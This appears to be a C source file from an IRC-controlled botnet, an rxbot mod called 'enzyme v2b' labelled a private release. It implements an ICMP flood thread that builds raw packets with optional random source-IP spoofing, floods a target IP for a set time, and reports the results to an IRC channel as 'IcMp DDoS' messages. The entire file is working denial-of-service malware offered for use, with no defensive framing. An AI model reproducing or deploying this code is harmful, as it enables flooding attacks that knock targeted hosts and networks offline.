/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/



#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

#ifndef NO_ICMP

DWORD WINAPI ICMPFloodThread(LPVOID param)
{
	ICMPFLOOD icmpflood = *((ICMPFLOOD *)param);
	ICMPFLOOD *icmpfloods = (ICMPFLOOD *)param;
	icmpfloods->gotinfo = TRUE;

	char sendbuf[IRCLINE], szSendBuf[60]={0};

	static ECHOREQUEST echo_req;

	SOCKET ssock;
	if ((ssock=fsocket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == INVALID_SOCKET) {
		sprintf(sendbuf,"Angelo (IcMp DDoS) »»  Error: socket() failed, returned: <%d>.", fWSAGetLastError());
		if (!icmpflood.silent) irc_privmsg(icmpflood.sock,icmpflood.chan,sendbuf,icmpflood.notice);
		addlog(sendbuf);

		clearthread(icmpflood.threadnum);

		ExitThread(0);
	}

	BOOL flag = TRUE;
	if (fsetsockopt(ssock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) == SOCKET_ERROR) {
		sprintf(sendbuf,"Angelo (IcMp DDoS) »»  Error: setsockopt() failed, returned: <%d>.", fWSAGetLastError());
		if (!icmpflood.silent) irc_privmsg(icmpflood.sock,icmpflood.chan,sendbuf,icmpflood.notice);
		addlog(sendbuf);

		clearthread(icmpflood.threadnum);

		ExitThread(0);
	}

	if (finet_addr(icmpflood.ip) == INADDR_NONE) {
		sprintf(sendbuf,"Angelo (IcMp DDoS) »»  Invalid target IP.");
		if (!icmpflood.silent) irc_privmsg(icmpflood.sock,icmpflood.chan,sendbuf,icmpflood.notice);
		addlog(sendbuf);

		clearthread(icmpflood.threadnum);

		ExitThread(0);
	}

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family=AF_INET;
	ssin.sin_port=fhtons(0);
	ssin.sin_addr.s_addr=finet_addr(icmpflood.ip);

	int sent = 0;
	unsigned long start = GetTickCount();

	while (((GetTickCount() - start) / 1000) <= (unsigned long)icmpflood.time) {
		echo_req.ipHeader.verlen=(4<<4 | sizeof(IPHEADER)/sizeof(unsigned long));
		echo_req.ipHeader.total_len=fhtons(sizeof(ECHOREQUEST));
		echo_req.ipHeader.ident=1;
		echo_req.ipHeader.frag_and_flags=0;
		echo_req.ipHeader.ttl=128;
		echo_req.ipHeader.proto=IPPROTO_ICMP;
		echo_req.ipHeader.checksum=0;
		echo_req.ipHeader.sourceIP=((icmpflood.spoof)?(rand()+(rand()<<8)+(rand()<<16)+(rand()<<24)):(finet_addr(GetIP(icmpflood.sock))));
		echo_req.ipHeader.destIP=ssin.sin_addr.s_addr;
		echo_req.icmpHeader.type = rand()%256;
		echo_req.icmpHeader.subcode = rand()%256;
		echo_req.icmpHeader.id = (rand() % 240) + 1;
		echo_req.icmpHeader.checksum = 0;
		echo_req.icmpHeader.seq = 1;

		//fill the packet data with a random character..
		memset(echo_req.cData, rand()%255, sizeof(echo_req.cData));
		if (fsendto(ssock, (const char *) &echo_req, sizeof(ECHOREQUEST), 0, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR) {
			fclosesocket(ssock);

			_snprintf(sendbuf,sizeof(sendbuf),"Angelo (IcMp DDoS) »»  Error sending packets to IP: %s. Packets sent: %d. Returned: <%d>.", icmpflood.ip, sent, fWSAGetLastError());
			if (!icmpflood.silent) irc_privmsg(icmpflood.sock, icmpflood.chan, sendbuf, icmpflood.notice);
			addlog(sendbuf);

			clearthread(icmpflood.threadnum);

			ExitThread(0);
		}
		sent++;
	}
	fclosesocket(ssock);

	sprintf(sendbuf,"Angelo (IcMp DDoS) »»  Done with %s flood to IP: %s. Sent: %d packet(s) @ %dKB/sec (%dMB).", icmpflood.type, icmpflood.ip, sent, (((sent * sizeof(szSendBuf)) / 1024) / icmpflood.time), (((sent * sizeof(szSendBuf)) / 1024) / 1024));
	if (!icmpflood.silent) irc_privmsg(icmpflood.sock, icmpflood.chan, sendbuf, icmpflood.notice);
	addlog(sendbuf);

	clearthread(icmpflood.threadnum);

	ExitThread(0);
}
#endif